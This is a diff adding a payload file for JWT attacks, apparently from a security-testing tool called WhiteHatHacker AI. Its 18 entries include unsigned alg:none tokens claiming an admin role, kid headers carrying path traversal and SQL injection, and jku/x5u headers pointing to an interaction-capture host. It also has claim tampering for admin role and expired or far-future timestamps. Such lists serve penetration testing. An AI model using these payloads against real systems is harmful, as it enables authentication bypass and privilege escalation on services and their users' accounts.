@@ -1,0 +1,25 @@
+# ============================================================================
+# WhiteHatHacker AI — JWT Manipulation Payloads (v3.0)
+# Categories: alg:none, Algorithm Confusion, kid Injection,
+#   jku/x5u Manipulation, Claim Tampering, Expiry Bypass
+# Total: 18 payloads
+# ============================================================================
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.
+{"alg":"HS256","typ":"JWT"}
+{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}
+{"alg":"HS256","kid":"key' UNION SELECT 'secret'--","typ":"JWT"}
+{"alg":"HS256","kid":"/proc/sys/kernel/hostname","typ":"JWT"}
+{"alg":"HS256","kid":"http://INTERACTSH_URL/","typ":"JWT"}
+{"alg":"RS256","jku":"http://INTERACTSH_URL/.well-known/jwks.json","typ":"JWT"}
+{"alg":"RS256","x5u":"http://INTERACTSH_URL/cert.pem","typ":"JWT"}
+{"sub":"admin","role":"admin","iss":"trusted-issuer"}
+{"sub":"admin","admin":true,"iss":"trusted-issuer"}
+{"sub":"admin","role":"superadmin","exp":9999999999}
+{"sub":"test","exp":0}
+{"sub":"test","exp":1}
+{"sub":"test","nbf":9999999999}
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
